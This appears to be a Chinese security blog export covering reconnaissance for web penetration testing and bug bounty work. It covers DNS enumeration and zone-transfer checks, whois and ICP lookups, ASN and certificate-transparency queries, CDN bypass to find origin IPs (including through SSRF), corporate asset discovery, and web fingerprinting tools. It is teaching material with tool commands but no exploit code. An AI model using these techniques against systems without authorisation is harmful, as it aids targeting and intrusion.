<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dig baidu.com			<span class="comment">#显示域名记录</span></span><br><span class="line">dig 114.114.114.114		<span class="comment">#通过ip地址反查DNS域名</span></span><br><span class="line">dig txt chaos VERSION.BIND @ns.dnsv4.com	<span class="comment">#查询DNS服务器的bind信息</span></span><br><span class="line">dig @dns.xxx.edu.cn axfr xxx.edu.cn			<span class="comment">#查询是否存在DNS区域传输</span></span><br></pre></td></tr></table></figure>
<h3 id="dnsenum"><a href="#dnsenum" class="headerlink" title="dnsenum"></a>dnsenum</h3><p>一款用于收集 dns 信息的工具,这款工具通过字典爆破、搜索引擎、whois 查询、区域传输等手段用于获取域名背后的 dns 信息。</p>
<p>Kali Linux内置工具</p>
<h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnsenum baidu.com     </span><br></pre></td></tr></table></figure>
<h3 id="dnswalk"><a href="#dnswalk" class="headerlink" title="dnswalk"></a>dnswalk</h3><p>利用DNS区域传输技术来获取DNS对应域名A记录。可以用来检验区域传输漏洞。</p>
<p>注意：使用时要在域名后面加一个点。</p>
<p>Kali Linux内置工具</p>
<h4 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnswalk baidu.com.</span><br></pre></td></tr></table></figure>
<blockquote>
<p>扩展：DNS区域传输漏洞</p>
<p>DNS区域传输（DNS zone transfer）指的是一台备用服务器使用来自主服务器的数据刷新自己的域（zone）数据库。这为运行中的DNS服务提供了一定的冗余度，其目的是为了防止主的域名服务器因意外故障变得不可用时影响到整个域名的解析。一般来说，DNS区域传输操作只在网络里真的有备用域名DNS服务器时才有必要用到，但许多DNS服务器却被错误地配置成只要有client发出请求，就会向对方提供一个zone数据库的详细信息，所以说允许不受信任的因特网用户执行DNS区域传输（zone transfer）操作是后果最为严重的错误配置之一。</p>
<p>区域传输漏洞的危害：黑客可以快速的判定出某个特定zone的所有主机，收集域信息，选择攻击目标，找出未使用的IP地址，黑客可以绕过基于网络的访问控制。</p>
</blockquote>
<h3 id="DNS在线查询"><a href="#DNS在线查询" class="headerlink" title="DNS在线查询"></a>DNS在线查询</h3><p><a href="https://dnsdumpster.com">https://dnsdumpster.com</a></p>
<p><a href="https://www.nslookup.io/">https://www.nslookup.io/</a></p>
<p><a href="http://tool.chinaz.com/dns/">http://tool.chinaz.com/dns/</a></p>
<p><a href="https://dnslytics.com/">https://dnslytics.com/</a></p>
<h2 id="Whois与ICP备案"><a href="#Whois与ICP备案" class="headerlink" title="Whois与ICP备案"></a>Whois与ICP备案</h2><h3 id="Whois查询"><a href="#Whois查询" class="headerlink" title="Whois查询"></a>Whois查询</h3><p>Whois是用来查询域名的IP以及所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的查询。早期的whois查询多以命令列接口存在，但是现在出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令列接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名/IP的whois信息由对应的管理机构保存。</p>
<h4 id="Web接口查询"><a href="#Web接口查询" class="headerlink" title="Web接口查询"></a>Web接口查询</h4><p><a href="http://whois.aliyun.com">http://whois.aliyun.com</a></p>
<p><a href="http://www.whois365.com/cn/">http://www.whois365.com/cn/</a></p>
<p><a href="http://whois.chianz.com/">http://whois.chianz.com/</a></p>
<p><a href="http://whois.aizhan.com/">http://whois.aizhan.com/</a></p>
<h4 id="Whois命令查询"><a href="#Whois命令查询" class="headerlink" title="Whois命令查询"></a>Whois命令查询</h4><p>Kali linux自带whois查询工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whois baidu.com</span><br></pre></td></tr></table></figure>
<h3 id="ICP备案"><a href="#ICP备案" class="headerlink" title="ICP备案"></a>ICP备案</h3><p>ICP，Internet Content Provider，中文全称：网络内容提供商。ICP可以理解为向广大用户提供互联网信息业务和增值业务的电信运营商，是经国家主管部门批准的正式运营企业或部门。</p>
<p>《互联网信息服务管理办法》指出互联网信息服务分为经营性和非经营性两类。国家对经营性互联网信息服务实行许可制度；对非经营性互联网信息服务实行备案制度。未取得许可或者未履行备案手续的，不得从事互联网信息服务。</p>
<p>ICP备案查询方法：</p>
<p><a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a> （ICP备案查询网）</p>
<p><a href="http://www.beian.miit.gov.cn/publish/query/indexFirst.action">http://www.beian.miit.gov.cn/publish/query/indexFirst.action</a> （工业和信息化部）</p>
<p><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a> （天眼查）</p>
<p><a href="http://icp.chinaz.com">http://icp.chinaz.com</a> （站长工具）</p>
<p><a href="http://cha.fute.com/index">http://cha.fute.com/index</a> （域名助手备案信息查询）</p>
<h3 id="IP反查域名"><a href="#IP反查域名" class="headerlink" title="IP反查域名"></a>IP反查域名</h3><p><a href="https://site.ip138.com/">https://site.ip138.com/</a></p>
<h2 id="AS号码查询"><a href="#AS号码查询" class="headerlink" title="AS号码查询"></a>AS号码查询</h2><p>自治系统(Autonomous System)是指使用统一内部路由协议的一组网络。 如果成员单位的网络路由器准备采用EGP（Exterior Gateway Protocol） BGP（Border Gateway Protocol）或 IDRP（OSI Inter-Domain Routing Protocol）协议，可以申请AS号码。 一般如果该单位的网络规模比较大或者将来会发展成较大规模的网络， 而且有多个出口，建议建立成一个自治系统，这样就需要AS号码。 如果网络规模较小，或者规模较为固定，而且只有一个出口， 可采用静态路由或其它路由协议，这样就不需要AS号码。</p>
<h3 id="在线查询"><a href="#在线查询" class="headerlink" title="在线查询"></a>在线查询</h3><p><a href="https://bgp.he.net/">https://bgp.he.net/</a></p>
<h3 id="Nmap脚本查询"><a href="#Nmap脚本查询" class="headerlink" title="Nmap脚本查询"></a>Nmap脚本查询</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap --script targets-asn -cript-args targets-asn.asn=45062</span><br></pre></td></tr></table></figure>
<p>可以先通过网站在线查询某公司的ASN，然后用Nmap脚本查询。</p>
<h2 id="证书透明度"><a href="#证书透明度" class="headerlink" title="证书透明度"></a>证书透明度</h2><p>证书透明度（CT）日志按设计包含由参与CA为任何给定域颁发的所有证书。SSL/TLS证书一般包含域名、子域名和电子邮件地址。这些日志是公开可用的，任何人都能看到这些日志。这使它们成为攻击者的信息宝库。</p>
<p>常用的查询CT的网站：</p>
<p><a href="https://crt.sh/">https://crt.sh/</a></p>
<p><a href="https://search.censys.io/certificates">https://search.censys.io/certificates</a></p>
<p><a href="https://transparencyreport.google.com/https/certificates">https://transparencyreport.google.com/https/certificates</a></p>
<h2 id="C段与旁注"><a href="#C段与旁注" class="headerlink" title="C段与旁注"></a>C段与旁注</h2><p>当渗透网站不存在漏洞或无法以成功渗透的情况下,这时可以采用旁注或C段思路进行渗透。</p>
<ul>
<li>C段：同网段不同服务器的渗透方案</li>
<li>旁注：同服务器不同站点的渗透方案</li>
</ul>
<p>常用Web工具</p>
<p><a href="https://chapangzhan.com/">https://chapangzhan.com/</a></p>
<p><a href="https://www.webscan.cc/">https://www.webscan.cc/</a></p>
<h2 id="CDN的绕过"><a href="#CDN的绕过" class="headerlink" title="CDN的绕过"></a>CDN的绕过</h2><h3 id="什么是CDN"><a href="#什么是CDN" class="headerlink" title="什么是CDN"></a>什么是CDN</h3><p>CDN的全称Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在CDN服务，将会影响到后续的安全测试过程。</p>
<p>CDN的关键技术：内容存储和内容分发。</p>
<p><img src="https://i.loli.net/2021/10/16/kuRNSU647JdDQt3.jpg" alt="CDN"></p>
<h3 id="如何知道该站点是否存在CDN？"><a href="#如何知道该站点是否存在CDN？" class="headerlink" title="如何知道该站点是否存在CDN？"></a>如何知道该站点是否存在CDN？</h3><p>使用超级ping：<a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p>
<p>若存在多个响应ip，则说明存在CDN</p>
<h3 id="如何绕过CDN获取真实ip"><a href="#如何绕过CDN获取真实ip" class="headerlink" title="如何绕过CDN获取真实ip"></a>如何绕过CDN获取真实ip</h3><ul>
<li><p>利用子域名请求获取真实ip</p>
<p>很多网站出于经济考虑，只对主站做CDN服务，可以从子域名入手获取真实ip</p>
</li>
</ul>
<ul>
<li><p>利用国外地址请求获取真实ip</p>
<p>一些站点由于服务对象基本在国内，或者成本原因，在国外一些地方没有CDN服务，如果用国外的服务器去请求站点域名，则会访问到站点的真实的IP地址。</p>
<p>这里用到了一款全球ping扫描工具，热点越低的国家效果越好。</p>
<p>IPIPtools：<a href="http://tools.ipip.net/cdn.php">http://tools.ipip.net/cdn.php</a></p>
</li>
</ul>
<ul>
<li><p>利用第三方接口查询获取真实ip</p>
<p><a href="https://get-site-ip.com/">https://get-site-ip.com/</a></p>
<p><a href="https://site.ip138.com/">https://site.ip138.com/</a>    （查看ip历史解析记录）</p>
</li>
</ul>
<ul>
<li><p>利用邮件服务器接口获取真实ip</p>
<p>一般不会对内部邮箱服务器做CDN服务</p>
<p>当你发邮件时，你可以通过邮件的源代码或者邮件头查看目标的真实IP</p>
</li>
</ul>
<ul>
<li><p>利用空间测绘引擎特定文件获取真实ip</p>
<p>如：查找ico图标文件：</p>
<ul>
<li><p>shodan—— http.favicon.hash:xxxxx</p>
</li>
<li><p>fofa—— icon_hash=xxxxxx</p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>遗留文件</p>
<p>如：phpinfo.php 会记录ip地址信息</p>
<p>可以利用Google搜索引擎搜索关键字：<code>inurl:phpinfo.php</code></p>
</li>
</ul>
<ul>
<li><p>APP流量抓包</p>
<p>利用抓包工具对APP流量进行抓包分析</p>
<p>如果是通过http协议的话，那么有可能发现web端的网站或是ip</p>
</li>
</ul>
<ul>
<li><p>通过SSRF漏洞发起请求</p>
<p>通过SSRF漏洞，使其来访问自己的外网服务器上的监听端口，由于是目标主机本身发起的http请求所以也请求自己的IP也是真实IP</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>资产收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>边缘资产与资产监控</title>
    <url>/post/80cf5bdb.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="边缘资产收集"><a href="#边缘资产收集" class="headerlink" title="边缘资产收集"></a>边缘资产收集</h2><p><strong>目标的相关性</strong>：各项目标之间有关联，相互支持，符合实际。</p>
<p><strong>企业的工商股权信息收集</strong>：目前所有的企业，都需要进行工商登记后才能正常运营。这方面数据是可以进行查询的。通过国家企业信息公示系统（<a href="http://www.gsxt.gov.cn">http://www.gsxt.gov.cn</a>)</p>
<p>国内一些企业通过爬虫、数据合作方式将企业相关的数据通过数据分析方法关联在一起，比如：企查查、天眼查、启信宝等等，我们可以通过这些平台<strong>查询目标企业旗下其他业务的子公司名称</strong>。</p>
<p>在第三方媒体发布的新闻，例如xxx公司收购了xxx教育公司，那么该SRC是极有可能接收该公司的漏洞的，我们<strong>多关注新闻可以快人一步，更好地找到新资产。</strong></p>
<h2 id="企业组织架构"><a href="#企业组织架构" class="headerlink" title="企业组织架构"></a>企业组织架构</h2><p>根据<strong>企业关键字</strong>，通过<strong>搜索引擎</strong>、<strong>爱企查</strong>、<strong>天眼查</strong>等平台找出相关的域名、下属单位、邮箱、联系人、电话等信息。同时，根据企业股权关系，也可查找相关的下属子公司企业的网站域名。</p>
<p>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></p>
<p>爱企查：<a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></p>
<ul>
<li>查找公司信息</li>
</ul>
<p><img src="https://i.loli.net/2021/10/05/oPSz1H9GjFxXf3K.png" alt="a388d30b8e3dcf8e9a3e23fc2cbd0186.png"></p>
<ul>
<li>查找公司股权结构</li>
</ul>
<p><img src="https://i.loli.net/2021/10/05/Cfs5xzVFjcWQmuK.png" alt="05ab1e45c7a4437a489e7c528893f3dc.png"></p>
<ul>
<li>查看个人图谱</li>
</ul>
<p><img src="https://i.loli.net/2021/10/05/XcyrwmHfdsv3JYM.png" alt="6c5a9a4b0b20ba804ae7460f9c6103f9.png"></p>
<h2 id="App、公众号、小程序"><a href="#App、公众号、小程序" class="headerlink" title="App、公众号、小程序"></a>App、公众号、小程序</h2><p>除此以外，对于分公司较多，在全国各地都有营业点的大型企业来说，信息收集的涵盖面包括各种网盘文库，开源社区，社工库，公众号也都是很好的切入点。不过以这些为信息的话，那就是基于关键字去进行搜素，关键字要尽可能的去概括包含所要搜索的集团的众多公司以及业务，关键字可以是公司缩写，主公司域名，公司产品名，主营业务等具有明显特征的词汇。</p>
<h3 id="APP"><a href="#APP" class="headerlink" title="APP"></a>APP</h3><p><strong>类型</strong>：商家APP、后台管理APP、业务APP、用户APP、SRC公告提到的APP等等。</p>
<p><strong>利用方式</strong>：通过反编译进行信息收集；通过抓取APP的流量进行信息收集。</p>
<p><strong>搜索方式：</strong></p>
<p><a href="https://app.diandian.com">https://app.diandian.com</a> （点点）</p>
<p><a href="https://www.qimai.cn">https://www.qimai.cn</a> （七麦）</p>
<h3 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h3><p><strong>类型</strong>：微信公众号、支付宝公众号、QQ公众号、生活号、企业号、百家号。</p>
<p><strong>利用方式</strong>：抓取后台接口进行信息收集。</p>
<p><strong>搜索方式：</strong></p>
<p><a href="https://weixin.sogou.com/">https://weixin.sogou.com/</a> （搜狗）</p>
<h3 id="小程序"><a href="#小程序" class="headerlink" title="小程序"></a>小程序</h3><p><strong>类型</strong>：微信小程序、支付宝小程序、百度小程序。</p>
<p><strong>利用方式</strong>：抓取后台接口进行信息收集。</p>
<p><strong>搜索方式：</strong></p>
<p><a href="https://www.xiaolanben.com/company">https://www.xiaolanben.com/company</a> （小蓝本）</p>
<p>注意：大多数的公众号的功能都只是用来进行文章报送，是没有后台接口的，因此这样的公众号并不是重点目标。需要作为<strong>重点渗透测试的是这种存在后台接口的即存在服务功能的公众号或者小程序</strong>，通过在物理机或者模拟器上打开代理抓包即可，除去weixin、app.eslink.cc等第三方相关的域名后，对剩下的陌生域名和进行下一轮的端口扫描和测试，不过这些后台接口获取到的IP资产，相来说都是很容易检查处有高危漏洞组件的存在。</p>
<h2 id="开源资产监控工具"><a href="#开源资产监控工具" class="headerlink" title="开源资产监控工具"></a>开源资产监控工具</h2><h3 id="ARL资产安全灯塔"><a href="#ARL资产安全灯塔" class="headerlink" title="ARL资产安全灯塔"></a>ARL资产安全灯塔</h3><p>斗象TCC团队正式发布「ARL资产安全灯塔」开源版，该项目现已上线开源社区GitHub。ARL旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。</p>
<p>项目地址：<a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p>
<h3 id="LangSrcCurise资产监控系统"><a href="#LangSrcCurise资产监控系统" class="headerlink" title="LangSrcCurise资产监控系统"></a>LangSrcCurise资产监控系统</h3><p>LangSrcCurise资产监控系统是一套通过网络搜索引擎监控其下指定域名，并且能进行持续性信息收集整理的自动化资产监控管理系统，基于Django开发。</p>
<p>项目地址：<a href="https://github.com/LangziFun/LangSrcCurise">https://github.com/LangziFun/LangSrcCurise</a></p>
<h3 id="linglong"><a href="#linglong" class="headerlink" title="linglong"></a>linglong</h3><p>一款资产巡航扫描系统。系统定位是通过masscan+nmap无限循环去发现新增资产，自动进行端口弱口令爆破/、指纹识别、XrayPoc扫描。</p>
<p>项目地址：<a href="https://github.com/awake1t/linglong">https://github.com/awake1t/linglong</a></p>
<h3 id="大宝剑资产梳理工具"><a href="#大宝剑资产梳理工具" class="headerlink" title="大宝剑资产梳理工具"></a>大宝剑资产梳理工具</h3><p>一款信息收集与资产梳理工具，项目处于测试阶段，会不定期更新。</p>
<p>项目地址：<a href="https://gitee.com/wgpsec/DBJ">https://gitee.com/wgpsec/DBJ</a></p>
<h3 id="Hawkeye"><a href="#Hawkeye" class="headerlink" title="Hawkeye"></a>Hawkeye</h3><p>监控github代码库，及时发现员工托管公司代码到GitHub行为并预警，降低代码泄露风险。</p>
<p>项目地址：<a href="https://github.com/0xbug/Hawkeye">https://github.com/0xbug/Hawkeye</a></p>
<h3 id="GSIL"><a href="#GSIL" class="headerlink" title="GSIL"></a>GSIL</h3><p>实时监控GitHub敏感信息泄露，并发送告警通知。</p>
<p>项目地址：<a href="https://github.com/FeeiCN/gsil">https://github.com/FeeiCN/gsil</a></p>
<p>改进版项目地址：<a href="https://github.com/StarLord777/GSIL_PRO">https://github.com/StarLord777/GSIL_PRO</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>资产收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>整站分析与指纹识别</title>
    <url>/post/6a2f7591.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="建站形式分析"><a href="#建站形式分析" class="headerlink" title="建站形式分析"></a>建站形式分析</h2><h3 id="分目录站点"><a href="#分目录站点" class="headerlink" title="分目录站点"></a>分目录站点</h3><ul>
<li><p>形如：</p>
<p><code>www.xxx.com</code> </p>
<p><code>www.xxx.com/bbs</code></p>
<p><code>www.xxx.com/old</code></p>
</li>
<li><p>渗透思路：</p>
<p>网站可能有多个cms或框架组成，那么对于渗透而言，相当于渗透目标是多个（一个cms一个思路）</p>
</li>
</ul>
<h3 id="分端口站点"><a href="#分端口站点" class="headerlink" title="分端口站点"></a>分端口站点</h3><ul>
<li><p>形如：</p>
<p><code>www.zzz.com</code></p>
<p><code>www.zzz.com:8080</code></p>
<p><code>www.zzz.com:8888</code></p>
</li>
</ul>
<ul>
<li><p>渗透思路：</p>
<p>网站可能有多个端口或框架组成，那么对于渗透而言，相当于渗透目标是多个（一个端口一个思路）</p>
</li>
</ul>
<h3 id="分域名站点"><a href="#分域名站点" class="headerlink" title="分域名站点"></a>分域名站点</h3><ul>
<li><p>形如：</p>
<p><code>www.yyy.com</code></p>
<p><code>bbs.yyy.com</code></p>
<p><code>blog.yyy.com</code></p>
</li>
</ul>
<ul>
<li><p>渗透思路：</p>
<p>分域名和主站可能同服务器或同网段，对于分域名渗透可以直接和主站进行联系</p>
</li>
</ul>
<h3 id="分移动端站点"><a href="#分移动端站点" class="headerlink" title="分移动端站点"></a>分移动端站点</h3><ul>
<li><p>形如：</p>
<p><code>www.yyy.com</code></p>
<p><code>m.yyy.com</code></p>
</li>
</ul>
<ul>
<li><p>渗透思路：</p>
<p>不同主站一套的移动端框架程序，需要对移动端站点另做测试</p>
</li>
</ul>
<h2 id="整站分析"><a href="#整站分析" class="headerlink" title="整站分析"></a>整站分析</h2><h3 id="服务器类型"><a href="#服务器类型" class="headerlink" title="服务器类型"></a>服务器类型</h3><p><strong>Windows</strong>：Server 2003、Server 2008、Server 2012、Server 2016……</p>
<p><strong>Linux</strong>：CentOS、RHEL、Ubuntu Server、Debian……</p>
<p>如何判断操作系统类型？</p>
<p>​    最简单的方法是通过Ping命令去探测：Windows的TTL值都是一般是128，Linux则是64。所以大于100的一般是Windows，而几十的一般是Linux。</p>
<p>​    判断目标网站服务器的具体的版本的话，可以采用 nmap 进行扫描， -O 和 -A 参数都能扫描出来。</p>
<h3 id="网站容器类型"><a href="#网站容器类型" class="headerlink" title="网站容器类型"></a>网站容器类型</h3><p>知道了这些信息之后，我们就需要知道网站用的web服务器是什么类型的：<strong>Apache、Nginx、Tomcat还是 IIS</strong>。知道了web服务器是哪种类型后，我们还要探测web服务器具体的版本。比如Ngnix版本&lt;0.83会有解析漏洞 ，IIS6.0会有文件名解析漏洞、IIS7.0会有畸形解析漏洞等。不同的web服务器版本，存在着不同漏洞。</p>
<h3 id="脚本类型"><a href="#脚本类型" class="headerlink" title="脚本类型"></a>脚本类型</h3><p>我们需要知道网站用的脚本类型：<strong>PHP</strong>、<strong>JSP</strong>、<strong>ASP</strong>、<strong>ASPX</strong>。</p>
<h3 id="数据库类型"><a href="#数据库类型" class="headerlink" title="数据库类型"></a>数据库类型</h3><p>我们需要知道网站用的是哪种类型的数据库：<strong>MySQL</strong>、<strong>Oracle</strong>、<strong>SqlServer</strong> 还是 <strong>Access</strong> 。虽然这几种数据库的语法大体上相同，但是还是有区别的。所以我们还是要知道目标网站用的是哪种数据库，并且数据库是哪个版本的。</p>
<p> <strong>常见脚本与数据库搭配</strong></p>
<p>ASP 和 ASPX：ACCESS、SQL Server</p>
<p>PHP：MySQL、PostgreSQL</p>
<p>JSP：Oracle、MySQL</p>
<h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><h3 id="指纹识别简介"><a href="#指纹识别简介" class="headerlink" title="指纹识别简介"></a>指纹识别简介</h3><p>在web渗透过程中，Web指纹识别是信息收集环节中一个比较重要的步骤，通过一些开源的工具、平台或者手工检测CMS系统是公开的CMS程序还是二次开发至关重要，能准确的获取CMS类型、Web服务组件类型及版本信息可以帮助安全工程师快速有效的去验证已知漏洞。</p>
<h3 id="常见指纹检测的对象"><a href="#常见指纹检测的对象" class="headerlink" title="常见指纹检测的对象"></a>常见指纹检测的对象</h3><ul>
<li>CMS信息：比如大汉CMS、织梦、帝国CMS、phpcms、ecshop等</li>
<li>前端技术：比如HTML5、jquery、bootstrap、pure、ace等</li>
<li>Web服务器：比如Apache、lighttpd, Nginx, IIS等</li>
<li>应用服务器：比如Tomcat、Jboss、weblogic、websphere等</li>
<li>开发语言：比如PHP、Java、Ruby、Python、C#等</li>
<li>操作系统信息：比如RHEL、win2008、centos等</li>
<li>CDN信息：是否使用CDN，如cloudflare、360cdn、365cyd、yunjiasu等</li>
<li>WAF信息：是否使用waf，如Topsec、Jiasule、Yundun等</li>
<li>IP及域名信息：IP和域名注册信息、服务商信息等</li>
<li>端口信息：有些软件或平台还会探测服务器开放的常见端口</li>
</ul>
<h3 id="常见的指纹识别方式"><a href="#常见的指纹识别方式" class="headerlink" title="常见的指纹识别方式"></a>常见的指纹识别方式</h3><h4 id="特定文件的MD5"><a href="#特定文件的MD5" class="headerlink" title="特定文件的MD5"></a>特定文件的MD5</h4><p>一些网站的特定图片文件、js文件、CSS等静态文件，如favicon.ico、css、logo.ico、js等文件一般不会修改，通过爬虫对这些文件进行抓取并比对md5值，如果和规则库中的Md5一致则说明是同一CMS。这种方式速度比较快，误报率相对低一些，但也不排除有些二次开发的CMS会修改这些文件。</p>
<h4 id="正常页面或错误网页中包含的关键字"><a href="#正常页面或错误网页中包含的关键字" class="headerlink" title="正常页面或错误网页中包含的关键字"></a>正常页面或错误网页中包含的关键字</h4><p>先访问首页或特定页面如robots.txt等，通过正则的方式去匹配某些关键字，如Powered by Discuz、dedecms等。\\n\\n或者可以构造错误页面，根据报错信息来判断使用的CMS或者中间件信息，比较常见的如tomcat的报错页面。</p>
<h4 id="请求头信息的关键字匹配"><a href="#请求头信息的关键字匹配" class="headerlink" title="请求头信息的关键字匹配"></a>请求头信息的关键字匹配</h4><p>根据网站response返回头信息进行关键字匹配，whatweb和Wappalyzer就是通过banner信息来快速识别指纹，之前fofa的web指纹库很多都是使用的这种方法，效率非常高，基本请求一次就可以，但搜集这些规则可能会耗时很长。而且这些banner信息有些很容易被改掉。</p>
<p>根据response header一般有以下几种识别方式：</p>
<ul>
<li>查看http响应报头的X-Powered-By字段来识别；</li>
<li>根据Cookies来进行判断，比如一些waf会在返回头中包含一些信息，如360wzws、Safedog、yunsuo等；</li>
<li>根据header中的Server信息来判断，如DVRDVS-Webs、yunjiasu-nginx、Mod_Security、nginx-wallarm等；</li>
<li>根据WWW-Authenticate进行判断，一些路由交换设备可能存在这个字段，如NETCORE、huawei、h3c等设备。</li>
</ul>
<h4 id="部分URL中包含的关键字"><a href="#部分URL中包含的关键字" class="headerlink" title="部分URL中包含的关键字"></a>部分URL中包含的关键字</h4><p>比如wp-includes、dede等URL关键特征。</p>
<p>通过规则库去探测是否有相应目录，或者根据爬虫结果对链接url进行分析，或者对robots.txt文件中目录进行检测等等方式，通过url地址来判别是否使用了某CMS，比如wordpress默认存在wp-includes和wp-admin目录，织梦默认管理后台为dede目录，solr平台可能使用/solr目录，weblogic可能使用wls-wsat目录等。</p>
<h3 id="开发语言的识别"><a href="#开发语言的识别" class="headerlink" title="开发语言的识别"></a>开发语言的识别</h3><p>web开发语言一般常见的有PHP、jsp、aspx、asp等，常见的识别方式有：</p>
<ul>
<li><p>通过爬虫获取动态链接进行直接判断是比较简便的方法。</p>
<p>比如：asp判别规则如下<code>&lt;a[^&gt;]*?href=(&#39;|&quot;)[^http][^&gt;]*?\.asp(\?|\#|\1)</code>，其他语言可替换相应asp即可。</p>
</li>
</ul>
<ul>
<li><p>通过X-Powered-By进行识别</p>
<p>比较常见的有X-Powered-By: ASP.NET或者X-Powered-By: PHP/7.1.8</p>
</li>
</ul>
<ul>
<li><p>通过Set-Cookie进行识别</p>
<p>这种方法比较常见也很快捷，比如Set-Cookie中包含PHPSSIONID说明是php、包含JSESSIONID说明是java、包含ASP.NET_SessionId说明是aspx等。</p>
</li>
</ul>
<h3 id="指纹识别工具"><a href="#指纹识别工具" class="headerlink" title="指纹识别工具"></a>指纹识别工具</h3><h4 id="国外指纹识别工具"><a href="#国外指纹识别工具" class="headerlink" title="国外指纹识别工具"></a>国外指纹识别工具</h4><h5 id="WhatWeb"><a href="#WhatWeb" class="headerlink" title="WhatWeb"></a>WhatWeb</h5><p>Kali Linux 內置工具。</p>
<p>Whatweb 是一个开源的网站指纹识别软件，拥有超过1700+个插件，它能识别的指纹包括 cms 类型、博客平台、网站流量分析软件、javascript 库、网站服务器，还可以识别版本号、邮箱地址、账户 id、web 框架模块等。</p>
<p>下载地址：<a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a></p>
<h5 id="Wapplyzer插件"><a href="#Wapplyzer插件" class="headerlink" title="Wapplyzer插件"></a>Wapplyzer插件</h5><p>Wappalyzer 是一个实用的跨平台网站分析工具，用于帮助开发者、研究者和设计者检测网页使用的是什么技术，以更好地衡量自己的项目中该使用什么技术。Wappalyzer 的功能和 BuiltWith 类似，可检测内容管理系统（CMS），电子商务平台、Web服务器、JavaScript框架和已安装的分析工具等。</p>
<p>Wappalyzer可直接在chrome或火狐的应用商城直接搜索安装。</p>
<p>Wappalyzer目前可识别65个大类的1216个应用，查看可检测的应用程序列表：<a href="https://wappalyzer.com/applications">https://wappalyzer.com/applications</a></p>
<p>下载地址：<a href="https://github.com/AliasIO/Wappalyzer">https://github.com/AliasIO/Wappalyzer</a></p>
<h5 id="Whatruns插件"><a href="#Whatruns插件" class="headerlink" title="Whatruns插件"></a>Whatruns插件</h5><p>Whatruns是为chrome开发的一款web指纹识别程序，还可以显示托管的CDN、wordpress插件、wordpress字体等，拥有丰富的插件支持。</p>
<p>跟Wappalyzer安装类似，Whatruns可直接在chrome应用商城直接搜索安装。</p>
<h5 id="Plecost"><a href="#Plecost" class="headerlink" title="Plecost"></a>Plecost</h5><p>Plecost是Wordpress博客引擎的漏洞指纹识别和漏洞查找器，能识别Wordpress版本并能查找到cve，不过访问不了google的话可能有些功能就受限了。Plecost基于python架构，利用了Beautiful Soup来解析html、xml文件识别网站使用的插件及版本。</p>
<p>下载地址：<a href="https://github.com/iniqua/plecost">https://github.com/iniqua/plecost</a></p>
<h4 id="国内指纹识别工具"><a href="#国内指纹识别工具" class="headerlink" title="国内指纹识别工具"></a>国内指纹识别工具</h4><h5 id="御剑web指纹识别程序"><a href="#御剑web指纹识别程序" class="headerlink" title="御剑web指纹识别程序"></a>御剑web指纹识别程序</h5><p>御剑web指纹识别程序是一款CMS指纹识别小工具，该程序由.NET 2.0框架开发，配置灵活、支持自定义关键字和正则匹配两种模式、使用起来简洁、体验良好。在指纹命中方面表现不错、识别速度很快、但目前比较明显的缺陷是指纹的配置库偏少。</p>
<p>windows下图形界面，比较亲民，扫描速度略慢，指纹库略少，可手工更新。</p>
<p>下载地址：<a href="https://www.webshell.cc/4697.html">https://www.webshell.cc/4697.html</a></p>
<h5 id="Test404轻量WEB指纹识别"><a href="#Test404轻量WEB指纹识别" class="headerlink" title="Test404轻量WEB指纹识别"></a>Test404轻量WEB指纹识别</h5><p>Test404轻量WEB指纹识别程序是一款CMS指纹识别小工具，配置灵活、支持自行添加字典、使用起来简洁、体验良好。在指纹命中方面表现不错、识别速度很快。可手动更新指纹识别库，而且该软件在2019.04月刚刚更新了一版。</p>
<p>下载地址：<a href="https://www.test404.com/post-1618.html">https://www.test404.com/post-1618.html</a></p>
